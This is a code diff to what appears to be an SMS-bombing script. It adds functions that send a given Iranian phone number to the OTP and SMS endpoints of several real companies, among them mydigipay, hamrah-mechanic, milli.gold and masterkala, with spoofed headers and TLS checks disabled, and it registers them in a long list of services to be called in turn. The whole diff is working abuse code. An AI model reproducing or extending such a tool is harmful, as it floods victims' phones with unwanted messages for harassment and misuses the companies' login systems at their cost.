@@ -596,6 +596,100 @@ def okala(phone):
 
 
 
+def mydigipay(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        payload = {
+            "cellNumber": phone,
+            "device": {
+                "deviceId": str(uuid.uuid4()),
+                "deviceModel": "iOS/Safari",
+                "deviceAPI": "WEB_BROWSER",
+                "osName": "WEB"
+            }
+        }
+        r = requests.post("https://api.mydigipay.com/digipay/api/users/send-sms", 
+                          json=payload, timeout=10)
+        return r.status_code == 200
+    except: return False
+
+
+
+
+def motorbargh(phone):
+    try:
+        data = {"action": "stm_login_register", "type": "mobile", "input": phone}
+        headers = {"X-Requested-With": "XMLHttpRequest"}
+        r = requests.post("https://motorbargh.shop/wp-admin/admin-ajax.php", 
+                          data=data, headers=headers, timeout=10, verify=False)
+        return r.json().get("success") is True
+    except: return False
+
+
+
+
+
+def mek(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        import requests, uuid
+        payload = {"PhoneNumber": phone, "landingPageUrl": "https://www.hamrah-mechanic.com/carprice/saipa/zamyadpickup/type-2543/", "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/", "prevUrl": "https://www.hamrah-mechanic.com/profile/"}
+        headers = {"Content-Type": "application/json", "env": "prd", "Source": "ios", "_uti": str(uuid.uuid4()), "X-Meta-Token": "413341"}
+        return requests.post("https://www.hamrah-mechanic.com/api/v1/membership/otp", json=payload, headers=headers, timeout=10, verify=False).status_code == 200
+    except: return False
+
+
+
+def milli_gold(phone, operation="REGISTER_USER"):
+    import requests, re
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '+98' + clean_phone[2:]
+        elif not clean_phone.startswith('+98'):
+            clean_phone = '+98' + clean_phone[1:] if clean_phone.startswith('0') else '+98' + clean_phone
+
+        if not re.match(r"^\+989\d{9}$", clean_phone):
+            return False
+
+        url = "https://milli.gold/api/v1/public/otp"
+        payload = {
+            "mobileNumber": clean_phone,
+            "operation": operation
+        }
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "X-Platform": "PWA",
+            "X-Channel": "MILLI",
+            "X-Client-Version": "1.0.0"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        try:
+            data = response.json()
+        except ValueError:
+            return False
+
+        return response.status_code == 200 and data.get("success", False)
+
+    except Exception:
+        return False
+
+
+
+def masterkala(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://masterkala.com/api/2.1.1.0.0/?route=profile/otp", 
+                          json={"type": "sendotp", "phone": phone}, 
+                          headers={"Origin": "https://masterkala.com", "Referer": "https://masterkala.com/"}, 
+                          timeout=10, verify=False)
+        return r.status_code == 200
+    except: return False
+
 
 
 # ==========================
@@ -606,7 +700,7 @@ services = [
     arzplus, arzunex, azkivam, azno, basalam,
     bimeh, bimehland, bimeparsian, bornosmode, chapmatin,
     darunet, didar24, digikala, ebimename, ibime,
-    padmira, vakiljo, abantether, ubitex, twox, theshoes, tetherland, t4f, sibapp, sheypoor, shahrfarsh, sarmayex, riiha, raheeno, tetherland, Raastin, pinket, pindo, otaghak, ompfinex, okala
+    padmira, vakiljo, abantether, ubitex, twox, theshoes, tetherland, t4f, sibapp, sheypoor, shahrfarsh, sarmayex, riiha, raheeno, tetherland, Raastin, pinket, pindo, otaghak, ompfinex, okala, masterkala, mek, mydigipay, motorbargh, milli_gold
 ]
 
 
